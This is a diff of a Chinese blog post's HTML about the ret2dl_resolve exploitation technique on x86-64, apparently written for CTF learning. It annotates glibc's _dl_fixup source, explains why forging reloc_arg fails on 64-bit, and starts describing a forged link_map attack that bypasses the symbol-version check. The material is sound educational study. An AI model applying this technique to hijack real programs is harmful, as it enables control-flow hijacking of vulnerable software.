-      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span>
-<span class="hljs-comment">	 address) is also known.  */</span>
-      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));
-      result = l;
-    &#125;
-
-  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span>
-  value = elf_machine_plt_value (l, reloc, value);
-
-  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span>
-      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))
-    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
-
-  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span>
-  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))
-    <span class="hljs-keyword">return</span> value;
-
-<span class="hljs-comment">/* 将函数的真实地址写入got表对应的表项，value为真实地址、rel_addr为需要写入的got表地址 */</span>
-  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
-&#125;</code></pre>
+<h4 id="ELFW宏"><a href="#ELFW宏" class="headerlink" title="ELFW宏"></a>ELFW宏</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We use this macro to refer to ELF macros independent of the native</span></span><br><span class="line"><span class="comment">   wordsize.  `ELFW(R_TYPE)' is used in place of `ELF32_R_TYPE' or</span></span><br><span class="line"><span class="comment">   `ELF64_R_TYPE'.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFW(type)	_ElfW (ELF, __ELF_NATIVE_CLASS, type)</span></span><br></pre></td></tr></table></figure>
+<h4 id="DL-FIXUP-MAKE-VALUE宏"><a href="#DL-FIXUP-MAKE-VALUE宏" class="headerlink" title="DL_FIXUP_MAKE_VALUE宏"></a>DL_FIXUP_MAKE_VALUE宏</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Construct a value of type DL_FIXUP_VALUE_TYPE from a code address</span></span><br><span class="line"><span class="comment">   and a link map.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DL_FIXUP_MAKE_VALUE(map, addr) (addr)</span></span><br></pre></td></tr></table></figure>
+<h4 id="SYMBOL-ADDRESS宏"><a href="#SYMBOL-ADDRESS宏" class="headerlink" title="SYMBOL_ADDRESS宏"></a>SYMBOL_ADDRESS宏</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Calculate the address of symbol REF using the base address from map MAP,</span></span><br><span class="line"><span class="comment">   if non-NULL.  Don't check for NULL map if MAP_SET is TRUE.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOL_ADDRESS(map, ref, map_set)				\</span></span><br><span class="line">  ((ref) == <span class="literal">NULL</span> ? <span class="number">0</span>							\</span><br><span class="line">   : (__glibc_unlikely ((ref)-&gt;st_shndx == SHN_ABS) ? <span class="number">0</span>			\</span><br><span class="line">      : LOOKUP_VALUE_ADDRESS (<span class="built_in">map</span>, map_set)) + (ref)-&gt;st_value)</span><br></pre></td></tr></table></figure>
+<h4 id="LOOKUP-VALUE-ADDRESS宏"><a href="#LOOKUP-VALUE-ADDRESS宏" class="headerlink" title="LOOKUP_VALUE_ADDRESS宏"></a>LOOKUP_VALUE_ADDRESS宏</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)-&gt;l_addr : 0)</span></span><br></pre></td></tr></table></figure>
+<h4 id="elf-machine-fixup-plt函数"><a href="#elf-machine-fixup-plt函数" class="headerlink" title="elf_machine_fixup_plt函数"></a>elf_machine_fixup_plt函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">ElfW</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"><span class="title">elf_machine_fixup_plt</span> <span class="params">(struct link_map *<span class="built_in">map</span>, <span class="keyword">lookup_t</span> t,</span></span></span><br><span class="line"><span class="function"><span class="params">		       <span class="keyword">const</span> ElfW(Sym) *refsym, <span class="keyword">const</span> ElfW(Sym) *sym,</span></span></span><br><span class="line"><span class="function"><span class="params">		       <span class="keyword">const</span> ElfW(Rela) *reloc,</span></span></span><br><span class="line"><span class="function"><span class="params">		       ElfW(Addr) *reloc_addr, ElfW(Addr) value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> *reloc_addr = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="x86-64下对于reloc-arg的特殊define"><a href="#x86-64下对于reloc-arg的特殊define" class="headerlink" title="x86-64下对于reloc_arg的特殊define"></a>x86-64下对于reloc_arg的特殊define</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The ABI calls for the PLT stubs to pass the index of the relocation</span></span><br><span class="line"><span class="comment">   and not its offset.  In _dl_profile_fixup and _dl_call_pltexit we</span></span><br><span class="line"><span class="comment">   also use the index.  Therefore it is wasteful to compute the offset</span></span><br><span class="line"><span class="comment">   in the trampoline just to reverse the operation immediately</span></span><br><span class="line"><span class="comment">   afterwards.  此时的reloc_arg类似于一个数组下标 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> reloc_offset reloc_arg * sizeof (PLTREL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> reloc_index  reloc_arg</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf/dl-runtime.c&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h4 id="dl-fixup源码阅读"><a href="#dl-fixup源码阅读" class="headerlink" title="_dl_fixup源码阅读"></a>_dl_fixup源码阅读</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)            ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)            ((i) &amp; 0xffffffff)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*这里由于我们是64位下的，请看：x86-64下对于reloc_arg的特殊define*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> reloc_offset</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_offset reloc_arg</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">	   struct link_map *l, ElfW(Word) reloc_arg</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//通过指向linkmap找到DT_SYMTAB，进而得到.dynsym地址，存在symtab里。</span></span><br><span class="line">    <span class="comment">//查找过程：l -&gt; linkmap -&gt; DT_SYMTAB -&gt; .dynsym</span></span><br><span class="line">    <span class="comment">//其中l指向linkmap，d_tag类型为DT_SYMTAB时，d_ptr指向.dynsym</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab </span><br><span class="line">   = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">//拿到.dynstr地址</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">//reloc_offset就是reloc_arg</span></span><br><span class="line">    <span class="comment">//将.rel.plt地址与reloc_offset相加，得到函数所对应的Elf64_Rel指针，记作reloc </span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span></span><br><span class="line"><span class="function">   </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">//将(reloc-&gt;r_info)&gt;&gt;32作为.dynsym下标，得到函数所对应的Elf64_Sym指针，记作sym</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="comment">//l-&gt;l_addr 加载共享对象的基本地址</span></span><br><span class="line">    <span class="comment">//l-&gt;l_addr + reloc-&gt;r_offset即为需要修改的got表地址。</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we're really looking at a PLT relocation.  */</span></span><br><span class="line">  <span class="comment">/* 检查r_info最低为是不是7 */</span></span><br><span class="line">  <span class="comment">/* ELFW(TYPE)是用来代替 Elf32_TYPE 或 Elf64_TYPE*/</span></span><br><span class="line">  <span class="comment">/* ELF_MACHINE_JMP_SLOT=7 有兴趣可以自己看源码在：glibc/latest/source/elf/elf.h */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don't look in the global scope.  */</span></span><br><span class="line">      </span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)   <span class="comment">//判断(sym-&gt;st_other)&amp;0x03是否为0</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">	    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;    </span><br><span class="line">      <span class="comment">//64位下没法伪造reloc_arg的原因：(reloc-&gt;r_info)&gt;&gt;32作为vernum下标取值容易出现非法内存访问</span></span><br><span class="line">      <span class="comment">//大佬的解释：64位程序bss段被映射到0x600000,我们伪造的.dynsym也在0x600000+,而DT_SYM结构体中的d_ptr还是在0x400000,这就意味着我们的r_info必然很大，再加上数据类型大小的不同，导致(reloc-&gt;r_info)&gt;&gt;32作为vernum下标取值时十分容易访问到0x400000和0x600000之间的不可读区域</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      #define ELF64_R_SYM(i)            ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="comment">      #define ELF64_R_TYPE(i)            ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 通过 strtab+sym-&gt;st_name 找到函数对应的字符串，result为libc_base */</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">     <span class="comment">/* 函数的真实地址 = libc_base(result) + 偏移地址*/</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将函数的真实地址写入got表对应的表项，value为真实地址、rel_addr为需要写入的got表地址 */</span></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h4 id="ret2dl-resolve-x86-64-重定向流程"><a href="#ret2dl-resolve-x86-64-重定向流程" class="headerlink" title="ret2dl_resolve_x86-64 重定向流程"></a>ret2dl_resolve_x86-64 重定向流程</h4><ul>
 <li>通过struct link_map *l获取 <em>.dynsym  .dynstr  .rel.plt</em> 地址</li>
 <li>将.rel.plt地址与reloc_offset相加，得到函数所对应的Elf64_Rel指针，记作reloc </li>
@@ -668,223 +462,35 @@ _dl_fixup (
 <li>通过 strtab+sym-&gt;st_name 在字符串表中找到函数对应的字符串，然后把真实地址赋给rel_addr（rel_addr指向got表中的对应位置），最后控制权交给这个函数，执行。</li>
 </ul>
 <h2 id="跟踪调试"><a href="#跟踪调试" class="headerlink" title="跟踪调试"></a>跟踪调试</h2><p>跟着之前的大师傅们调试一波</p>
-<h3 id="运行时查看-dynamic"><a href="#运行时查看-dynamic" class="headerlink" title="运行时查看.dynamic"></a>运行时查看.dynamic</h3><p><img src="https://s1.ax1x.com/2020/06/11/tHDPq1.png" srcset="/img/loading.gif" alt=""></p>
-<h3 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h3><p><img src="https://s1.ax1x.com/2020/06/11/tHrf1g.png" srcset="/img/loading.gif" alt=""></p>
-<h3 id="进入-dl-fixup"><a href="#进入-dl-fixup" class="headerlink" title="进入_dl_fixup"></a>进入_dl_fixup</h3><p><img src="https://s1.ax1x.com/2020/06/11/tHsoxe.png" srcset="/img/loading.gif" alt=""><br><img src="https://s1.ax1x.com/2020/06/11/tH6mkt.png" srcset="/img/loading.gif" alt=""><br>这里拿到函数对应的Elf64_Sym地址<br><img src="https://s1.ax1x.com/2020/06/11/tHWJJI.png" srcset="/img/loading.gif" alt=""><br>看雪上有师傅计算过，当作为数组下标时（64位），很容易出现非法内存访问。这里我就不算了。<br>贴上大师傅的解释：<br><em>const ElfW(Sym) const symtab = 0x400280<br>const ElfW(Half) vernum = 0x4003d8<br>(r_info&gt;&gt;32)作为symtab的下标时，其值大于0x600000小于0x601000,也就是说0x1553a&lt;(r_info&gt;&gt;32)≤0x15fe5<br>(r_info&gt;&gt;32)作为vernum下标时，要使得不产生非法内存访问，需要0≤(r_info&gt;&gt;32)≤0x614或者0xffe14≤(r_info&gt;&gt;32)≤0x100614<br>无法找到同时满足二者的(r_info&gt;&gt;32)的值</em></p>
+<h3 id="运行时查看-dynamic"><a href="#运行时查看-dynamic" class="headerlink" title="运行时查看.dynamic"></a>运行时查看.dynamic</h3><p><img src="https://s1.ax1x.com/2020/06/11/tHDPq1.png" alt=""></p>
+<h3 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h3><p><img src="https://s1.ax1x.com/2020/06/11/tHrf1g.png" alt=""></p>
+<h3 id="进入-dl-fixup"><a href="#进入-dl-fixup" class="headerlink" title="进入_dl_fixup"></a>进入_dl_fixup</h3><p><img src="https://s1.ax1x.com/2020/06/11/tHsoxe.png" alt=""><br><img src="https://s1.ax1x.com/2020/06/11/tH6mkt.png" alt=""><br>这里拿到函数对应的Elf64_Sym地址<br><img src="https://s1.ax1x.com/2020/06/11/tHWJJI.png" alt=""><br>看雪上有师傅计算过，当作为数组下标时（64位），很容易出现非法内存访问。这里我就不算了。<br>贴上大师傅的解释：<br><em>const ElfW(Sym) const symtab = 0x400280<br>const ElfW(Half) vernum = 0x4003d8<br>(r_info&gt;&gt;32)作为symtab的下标时，其值大于0x600000小于0x601000,也就是说0x1553a&lt;(r_info&gt;&gt;32)≤0x15fe5<br>(r_info&gt;&gt;32)作为vernum下标时，要使得不产生非法内存访问，需要0≤(r_info&gt;&gt;32)≤0x614或者0xffe14≤(r_info&gt;&gt;32)≤0x100614<br>无法找到同时满足二者的(r_info&gt;&gt;32)的值</em></p>
 <h2 id="伪造link-map攻击"><a href="#伪造link-map攻击" class="headerlink" title="伪造link_map攻击"></a>伪造link_map攻击</h2><h3 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h3><p>64位和32位比，最容易出问题的就是这里</p>
-<pre><code class="hljs c"><span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)
-	&#123;
-	  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Half)</span> *vernum </span>=
-	    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
-	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;    
-      <span class="hljs-comment">//64位下没法伪造reloc_arg的原因：(reloc-&gt;r_info)&gt;&gt;32作为vernum下标取值容易出现非法内存访问</span>
-
-      <span class="hljs-comment">/*</span>
-<span class="hljs-comment">      #define ELF64_R_SYM(i)            ((i) &gt;&gt; 32)</span>
-<span class="hljs-comment">      #define ELF64_R_TYPE(i)            ((i) &amp; 0xffffffff)</span>
-<span class="hljs-comment">      */</span>
-
-	  version = &amp;l-&gt;l_versions[ndx];
-	  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)
-	    version = <span class="hljs-literal">NULL</span>;
-	&#125;</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">	    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;    </span><br><span class="line">      <span class="comment">//64位下没法伪造reloc_arg的原因：(reloc-&gt;r_info)&gt;&gt;32作为vernum下标取值容易出现非法内存访问</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      #define ELF64_R_SYM(i)            ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="comment">      #define ELF64_R_TYPE(i)            ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 <p>而<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>对应的就是</p>
-<pre><code class="hljs asm">mov rax, qword ptr [r10 + 0x1c8]</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, qword ptr [r10 + 0x1c8]</span><br></pre></td></tr></table></figure>
 <p>那么我们通过控制<em>link_map + 0x1c8</em>的值就可以绕过这个if，再来看一下这一段整个的情况：</p>
-<pre><code class="hljs c">   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span>
-<span class="hljs-comment">      used don't look in the global scope.  */</span>
-<span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断(sym-&gt;st_other)&amp;0x03是否为0</span>
-    &#123;
-      <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> = <span class="hljs-title">NULL</span>;</span>
-
-      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//mov rax, qword ptr [r10 + 0x1c8]</span>
-        &#123;
-            <span class="hljs-comment">/*省略*/</span>
-        &#125;
-    &#125;
-
-<span class="hljs-keyword">else</span>
-    &#123;
-      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span>
-<span class="hljs-comment">	 address) is also known.  */</span>
-      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));
-      result = l;
-    &#125;</code></pre>
